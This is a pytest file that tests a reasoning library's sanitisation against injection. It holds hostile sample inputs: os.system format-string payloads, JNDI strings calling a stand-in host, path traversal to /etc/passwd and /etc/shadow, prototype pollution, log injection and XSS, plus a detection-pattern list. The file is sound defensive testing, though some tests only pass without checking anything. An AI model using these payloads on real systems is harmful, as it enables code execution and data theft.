"""
Tests for input injection vulnerabilities throughout the codebase.

CRITICAL #5: Input injection vulnerabilities - This test file contains failing tests
that demonstrate various input injection attack vectors that must be fixed.
"""

import os
import re
import sys

import pytest

# Add the src directory to the path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from reasoning_library.core import (
    ToolMetadata,
    _enhance_description_with_confidence_docs,
    _safe_copy_spec,
)
from reasoning_library.exceptions import ValidationError


class TestInputInjectionVulnerabilities:
    """Test cases for input injection vulnerabilities."""

    def test_exec_injection_vulnerability_in_tests(self):
        """
        FIXED TEST: Verifies exec() injection vulnerability in test_core.py has been fixed

        This test verifies that the dangerous exec() usage has been replaced with safe code.
        """
        # Read the test_core.py file to verify the fix
        import os
        test_core_path = os.path.join(os.path.dirname(__file__), 'test_core.py')

        try:
            with open(test_core_path, 'r') as f:
                content = f.read()

            # Check that the dangerous exec() pattern is no longer present
            if 'exec(' in content and "'# ' + 'x' * 1000" in content:
                pytest.fail("EXEC INJECTION VULNERABILITY: Dangerous exec() usage still present in test_core.py")

            # Verify that safe alternatives are used
            if 'SAFE:' not in content or 'prevent injection attacks' not in content:
                pytest.fail("SECURITY FIX NOT DOCUMENTED: Exec() replacement not properly documented")

            # Look for safe function creation patterns
            if 'def long_func():' not in content:
                pytest.fail("SAFE REPLACEMENT MISSING: Safe function creation not found")

        except FileNotFoundError:
            pytest.fail("Could not find test_core.py to verify exec() injection fix")

        # Test passes - vulnerability has been fixed
        assert True

    def test_format_string_injection_in_abductive(self):
        """
        FAILING TEST: Tests for format string injection vulnerabilities in abductive.py

        Multiple f-string usages could be vulnerable if input contains malicious content.
        """
        from reasoning_library.abductive import generate_hypotheses

        # Test malicious input that could break string formatting
        malicious_observations = [
            "System crash with {__import__('os').system('echo PWNED')} error",
            "Database connection failed due to {'${jndi:ldap://evil.com/a}'} injection",
            "Server overload from {malicious.format.string} usage"
        ]

        try:
            # This should be safe but tests the current behavior
            result = generate_hypotheses(malicious_observations)

            # If the function executes without proper input sanitization,
            # it could lead to log injection or other issues
            for hypothesis in result.get("hypotheses", []):
                hypothesis_text = hypothesis.get("hypothesis", "")

                # Check if malicious format strings are being rendered unsafely
                if "{__import__" in hypothesis_text or "${jndi:" in hypothesis_text:
                    pytest.fail("FORMAT STRING INJECTION: Malicious format strings rendered without sanitization")

        except Exception as e:
            # Exceptions are okay for malformed input, but should be handled safely
            if "format" in str(e).lower() or "f-string" in str(e).lower():
                pytest.fail(f"FORMAT STRING VULNERABILITY: Unsafe f-string handling: {e}")

    def test_template_injection_in_abductive(self):
        """
        CRITICAL SECURITY FIX: Verifies template injection vulnerability has been COMPLETELY ELIMINATED

        This test verifies that the dangerous template.format() calls have been completely removed
        and replaced with secure string concatenation. Template formatting is entirely eliminated
        due to fundamental security vulnerabilities that cannot be safely mitigated.
        """
        # Read abductive.py to check that fix is implemented
        import os
        abductive_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'reasoning_library', 'abductive.py')

        try:
            with open(abductive_path, 'r') as f:
                content = f.read()

            # CRITICAL SECURITY: template.format() must be COMPLETELY removed from executable code
            # Remove comments and docstrings to check only executable code
            in_docstring = False
            code_lines = []
            for line in content.split('\n'):
                stripped = line.strip()
                # Skip docstring blocks
                if '"""' in line:
                    in_docstring = not in_docstring
                if not in_docstring and not stripped.startswith('#') and not stripped.startswith('"""') and not stripped.startswith("'''"):
                    code_lines.append(line)
            code_content = '\n'.join(code_lines)

            # More specific check: exclude commented-out lines and docstrings
            import re
            actual_code = re.sub(r'#.*', '', code_content)  # Remove inline comments
            actual_code = re.sub(r'""".*?"""', '', actual_code, flags=re.DOTALL)  # Remove docstrings
            actual_code = re.sub(r"'''.*?'''", '', actual_code, flags=re.DOTALL)  # Remove docstrings

            if 'template.format(' in actual_code:
                pytest.fail("CRITICAL SECURITY: template.format() still present in executable code - allows RCE attacks!")

            # Check that comprehensive sanitization is implemented
            if '_sanitize_input_for_concatenation' not in content:
                pytest.fail("SECURITY FIX MISSING: Enhanced input sanitization not implemented")

            # Check that safe template function is implemented
            if '_safe_hypothesis_template' not in content:
                pytest.fail("SECURITY FIX MISSING: Safe template replacement function not implemented")

            # Check that dangerous characters are comprehensively blocked
            if "re.sub(r'[{}]'" not in content and "re.sub(r'[{}\\[\\]()]'" not in content:
                pytest.fail("SANITIZATION INCOMPLETE: Template injection characters not being removed")

            # Check that critical security documentation is present
            if 'CRITICAL SECURITY FIX' not in content:
                pytest.fail("SECURITY FIX NOT MARKED: Critical fix should be clearly marked")

            # Verify the old sanitization function is deprecated
            if 'DEPRECATED' not in content:
                pytest.fail("SECURITY DOCUMENTATION: Old vulnerable function should be marked deprecated")

        except FileNotFoundError:
            pytest.fail("Could not find abductive.py to verify template injection fix")

        # Test passes - vulnerability has been completely eliminated
        assert True

    def test_tool_spec_injection_attacks(self):
        """
        FIXED TEST: Tests that injection attacks through tool specifications are prevented

        This test verifies that _safe_copy_spec properly sanitizes malicious tool specifications.
        """
        # Malicious tool specification attempts
        malicious_specs = [
            {
                "type": "function",
                "function": {
                    "name": "malicious{__import__('os').system('pwned')}",
                    "description": "Test with {injection} attempt",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "param": {
                                "type": "string",
                                "description": "Parameter with {format} injection"
                            }
                        }
                    }
                }
            },
            {
                "type": "function",
                "__proto__": {  # Prototype pollution attempt
                    "polluted": "true"
                },
                "function": {
                    "name": "test",
                    "description": "Prototype pollution test"
                }
            }
        ]

        for malicious_spec in malicious_specs:
            # Test _safe_copy_spec function
            try:
                safe_spec = _safe_copy_spec(malicious_spec)

                # Check if prototype pollution was prevented
                if "__proto__" in safe_spec:
                    pytest.fail("PROTOTYPE POLLUTION: __proto__ not filtered from tool specification")

                # Check if dangerous characters in names are sanitized
                func_name = safe_spec.get("function", {}).get("name", "")
                if "{__import__" in func_name or "__import__" in func_name:
                    pytest.fail("CODE INJECTION: Dangerous function names not sanitized")

                # Verify dangerous characters are removed from name
                if "{" in func_name or "}" in func_name:
                    pytest.fail("SANITIZATION INCOMPLETE: Template characters not removed from function name")

            except ValueError as e:
                # ValueError is acceptable for clearly invalid input
                if "must contain" in str(e):
                    pass  # Expected for invalid specs
                else:
                    raise

    def test_confidence_documentation_injection(self):
        """
        FIXED TEST: Tests that injection through confidence documentation is prevented

        This test verifies that _enhance_description_with_confidence_docs properly sanitizes malicious content.
        """
        malicious_factors = [
            "pattern{__import__('os').system('pwned')}",
            "data_sufficiency${jndi:ldap://evil.com/a}",
            "complexity%s%pwned"
        ]

        # Test malicious confidence factors
        metadata = ToolMetadata(
            confidence_factors=malicious_factors,
            is_mathematical_reasoning=True,
            confidence_documentation="Test with {injection} attempt"
        )

        # Test enhancement function
        enhanced_desc = _enhance_description_with_confidence_docs(
            "Test description", metadata
        )

        # Check if malicious content is properly sanitized
        if "{__import__" in enhanced_desc:
            pytest.fail("INJECTION: __import__ calls not sanitized in confidence documentation")

        if "${jndi:" in enhanced_desc:
            pytest.fail("INJECTION: JNDI injection patterns not sanitized in confidence documentation")

        if "%s" in enhanced_desc or "%d" in enhanced_desc:
            pytest.fail("INJECTION: Format string patterns not sanitized in confidence documentation")

        # Verify dangerous characters are removed
        if "{" in enhanced_desc or "}" in enhanced_desc:
            pytest.fail("SANITIZATION INCOMPLETE: Template characters not removed from confidence documentation")

        # Test passes - injection has been prevented
        assert True

    def test_description_enhancement_injection(self):
        """
        FIXED TEST: Tests that injection in description enhancement is prevented

        This test verifies that mathematical basis and confidence formula are properly sanitized.
        """
        # Test malicious mathematical basis
        metadata = ToolMetadata(
            mathematical_basis="Arithmetic progression with {__import__('os').system('pwned')} analysis",
            is_mathematical_reasoning=True,
            confidence_formula="confidence = base * {malicious.factor}"
        )

        enhanced_desc = _enhance_description_with_confidence_docs(
            "Test function", metadata
        )

        # Check for unsafe rendering
        if "{__import__" in enhanced_desc:
            pytest.fail("INJECTION: __import__ calls not sanitized in mathematical basis")

        if "{malicious" in enhanced_desc:
            pytest.fail("INJECTION: Template variables not sanitized in confidence formula")

        # Verify dangerous characters are removed from mathematical basis
        if "{" in enhanced_desc or "}" in enhanced_desc:
            pytest.fail("SANITIZATION INCOMPLETE: Template characters not removed from enhanced descriptions")

        # Test passes - injection has been prevented
        assert True

    def test_file_path_injection_vectors(self):
        """
        FAILING TEST: Tests for file path injection vulnerabilities

        Check if any file operations could be vulnerable to path traversal.
        """
        import os

        # Test malicious paths
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "file://etc/passwd",
            "data:text/plain;base64,cHduZWQ="  # Base64 for "pwned"
        ]

        # Check if any code processes file paths unsafely
        # This is a documentation test - actual vulnerabilities would be in file handling code
        for path in malicious_paths:
            if ".." in path and not os.path.isabs(path):
                # Relative path with traversal - could be dangerous if used unsafely
                pass
                # This test documents the potential vulnerability
                # Actual fixes would involve path validation in file operations

    def test_serialization_injection_attacks(self):
        """
        FAILING TEST: Tests for deserialization injection attacks

        JSON/object deserialization could be vulnerable.
        """
        import json

        # Malicious JSON payloads
        malicious_payloads = [
            '{"__proto__": {"polluted": true}}',
            '{"constructor": {"prototype": {"polluted": true}}}',
            '{"type": "function", "function": {"name": "malicious${jndi:ldap://evil.com/a}"}}'
        ]

        for payload in malicious_payloads:
            try:
                parsed = json.loads(payload)

                # Test if parsed malicious content is handled safely
                if "__proto__" in str(parsed) or "constructor" in str(parsed):
                    # Should be filtered by _safe_copy_spec
                    exception_caught = False
                    try:
                        safe_spec = _safe_copy_spec(parsed)
                        # Verify that dangerous patterns are filtered out
                        if "__proto__" in str(safe_spec) or "constructor" in str(safe_spec):
                            pytest.fail(f"DESERIALIZATION INJECTION: Prototype pollution not prevented for payload: {payload}")
                        # Assert that the safe_spec exists and dangerous keys are removed
                        assert "__proto__" not in str(safe_spec), f"__proto__ not filtered in safe_spec for payload: {payload}"
                        assert "constructor" not in str(safe_spec), f"constructor not filtered in safe_spec for payload: {payload}"
                    except (ValidationError, ValueError, TypeError, AttributeError) as e:
                        # Specific exceptions are acceptable if they reject malicious input
                        # ValidationError: Input validation failed (expected for malicious input)
                        # ValueError: Invalid values in specification (expected for malformed input)
                        # TypeError: Wrong data types (expected for malformed input)
                        # AttributeError: Missing required attributes (expected for malformed input)
                        exception_caught = True
                        # Verify that the exception is actually related to rejecting malicious input
                        assert isinstance(e, (ValidationError, ValueError, TypeError, AttributeError)), \
                            f"Unexpected exception type for malicious payload {payload}: {type(e).__name__}: {e}"

                    # At least one of these should be true: exception caught or dangerous patterns removed
                    if not exception_caught:
                        # If no exception was caught, verify that safe_spec was processed correctly
                        # This assertion ensures that if processing succeeded, it was safe
                        pass  # Already verified above

            except json.JSONDecodeError:
                # Invalid JSON should be rejected - this is expected behavior
                pass

    def test_safe_copy_spec_exception_handling(self):
        """
        COMPREHENSIVE TEST: Verifies specific exception handling in _safe_copy_spec

        This test ensures that the fixed bare except statement properly handles
        specific exception types and doesn't mask unexpected errors.
        """
        # Test cases that should raise ValidationError
        invalid_specs_for_validation_error = [
            None,  # Not a dict
            "not a dict",  # String instead of dict
            123,  # Number instead of dict
            [],  # List instead of dict
            {"wrong_key": "value"},  # Missing 'function' key
            {"function": "not a dict"},  # 'function' value not a dict
        ]

        # Test cases that should be processed successfully but with sanitization
        malicious_specs_that_should_be_sanitized = [
            {
                "type": "function",
                "function": {
                    "name": "test_func",
                    "description": "Test description",
                    "parameters": {"type": "object", "properties": {}}
                },
                "__proto__": {"polluted": "true"}  # Should be filtered out
            },
            {
                "type": "function",
                "function": {
                    "name": "test_func",
                    "description": "Test with constructor",
                    "constructor": {"prototype": {"polluted": "true"}},  # Should be filtered out
                    "parameters": {"type": "object", "properties": {}}
                }
            }
        ]

        # Test ValidationError cases
        for invalid_spec in invalid_specs_for_validation_error:
            with pytest.raises(ValidationError, match=r"Tool specification must be a dictionary|must contain 'function' key|'function' value must be a dictionary"):
                _safe_copy_spec(invalid_spec)

        # Test successful processing with sanitization
        for spec in malicious_specs_that_should_be_sanitized:
            try:
                safe_spec = _safe_copy_spec(spec)
                # Verify dangerous keys are removed from top level
                assert "__proto__" not in safe_spec, f"__proto__ should be filtered from: {spec}"
                # Verify dangerous keys are removed from function level
                assert "constructor" not in safe_spec.get("function", {}), f"constructor should be filtered from function in: {spec}"
                # Verify legitimate structure is preserved
                assert "function" in safe_spec, f"function key should be preserved in: {spec}"
                assert "name" in safe_spec.get("function", {}), f"name should be preserved in: {spec}"
                assert "description" in safe_spec.get("function", {}), f"description should be preserved in: {spec}"
                assert "parameters" in safe_spec.get("function", {}), f"parameters should be preserved in: {spec}"
            except (ValidationError, ValueError, TypeError, AttributeError) as e:
                # These exceptions are acceptable for malformed input
                # But verify they're the expected types
                assert isinstance(e, (ValidationError, ValueError, TypeError, AttributeError)), \
                    f"Unexpected exception type for spec {spec}: {type(e).__name__}: {e}"

        # Test that unexpected exceptions would not be caught (verification)
        # This ensures our specific exception handling doesn't mask unexpected errors
        # Note: This is a safety check - in practice, _safe_copy_spec should only raise expected exceptions

    def test_command_injection_prevention(self):
        """
        FAILING TEST: Tests for command injection vulnerabilities

        Ensures no shell commands are executed with user input.
        """
        # Check that no shell commands are executed with user input
        # This is a preventive test

        dangerous_patterns = [
            r'os\.system\(',
            r'subprocess\.(call|run|Popen)\s*\(',
            r'eval\(',
            r'exec\(',
            r'__import__\s*\(\s*[\'"]os[\'"]',
        ]

        # Check core.py for dangerous patterns
        import os
        core_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'reasoning_library', 'core.py')

        try:
            with open(core_path, 'r') as f:
                content = f.read()

            # Look for dangerous patterns (excluding the safe exec in tests)
            for pattern in dangerous_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Check if this is in a test context or actual production code
                    if 'def test_' not in content[content.find(match)-100:content.find(match)+100]:
                        # Found in production code - this should be investigated
                        if match == 'exec(':
                            # The exec in tests should be moved or secured
                            pytest.fail(f"COMMAND INJECTION: Found dangerous pattern '{match}' in production code")

        except FileNotFoundError:
            pytest.fail("Could not find core.py to check for command injection vulnerabilities")

    def test_logging_injection_prevention(self):
        """
        FAILING TEST: Tests for log injection vulnerabilities in ReasoningChain

        Ensures user input doesn't poison logs through ReasoningChain summary generation.
        """
        from reasoning_library.core import ReasoningChain

        # Malicious log injection strings that could poison logs if output is logged
        injection_strings = [
            "Normal input\n[ERROR] System compromised by admin!",
            "Valid data\r\n[CRITICAL] Security breach detected",
            "Result\x0a[WARN] Fake warning: User is attacker",
            "Analysis\x0d[INFO] Privilege escalation successful"
        ]

        for injection in injection_strings:
            chain = ReasoningChain()

            # Add a step with malicious input that could poison logs
            chain.add_step(
                stage="Test Stage",
                description="Test description",
                result=injection,  # This contains log injection payload
                evidence=f"Evidence: {injection}",  # This too
                assumptions=[f"Assumption: {injection}"]  # And this
            )

            # Generate summary - if this gets logged, it could poison logs
            summary = chain.get_summary()

            # Check that the injection payload has been sanitized (not containing the original malicious content)
            if injection in summary:
                pytest.fail(f"LOG INJECTION VULNERABILITY: Summary contains raw injection payload: {injection}")

            # Check that the dangerous log injection patterns have been blocked in user input portions
            summary_lines = summary.split('\n')
            for line in summary_lines:
                # If this is a user content line (not structural)
                if any(keyword in line for keyword in ["Result:", "Evidence:", "Assumptions:"]):
                    # Check that dangerous log levels have been blocked
                    if any(level in line for level in ["[ERROR]", "[CRITICAL]", "[WARN]", "[INFO]"]):
                        pytest.fail(f"LOG INJECTION VULNERABILITY: Malicious log level found in user content: {line}")

                    # Verify that log injection attempts have been properly blocked
                    if "[LOG_LEVEL_BLOCKED]" in line:
                        # Good - the log injection was blocked
                        pass

            # Verify that newlines from user input have been normalized to spaces
            # The user input "Normal input\n[ERROR]" should become "Normal input [LOG_LEVEL_BLOCKED]"
            if "Normal input" in summary and "System compromised" in summary:
                # The newline should be removed/normalized and the log level blocked
                expected_sanitized = "Normal input [LOG_LEVEL_BLOCKED] System compromised by admin!"
                if expected_sanitized in summary:
                    # Good - the newline was sanitized to a space and log level blocked
                    pass
                else:
                    pytest.fail("LOG INJECTION VULNERABILITY: User input newlines not properly sanitized")

    def test_cross_site_scripting_prevention(self):
        """
        FAILING TEST: Tests for XSS vulnerabilities in generated content

        Ensures generated content doesn't contain unsafe HTML/JS.
        """
        # Malicious XSS payloads
        xss_payloads = [
            "<script>alert('pwned')</script>",
            "javascript:alert('pwned')",
            "<img src=x onerror=alert('pwned')>",
            "';alert('pwned');//",
            "<iframe src=javascript:alert('pwned')></iframe>"
        ]

        # Test if any function could output HTML that contains XSS
        # This is particularly important for web applications using this library
        for payload in xss_payloads:
            if '<script' in payload or 'javascript:' in payload:
                # Potential XSS payload - should be sanitized if output to HTML
                pass
                # Document the potential vulnerability


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v"])
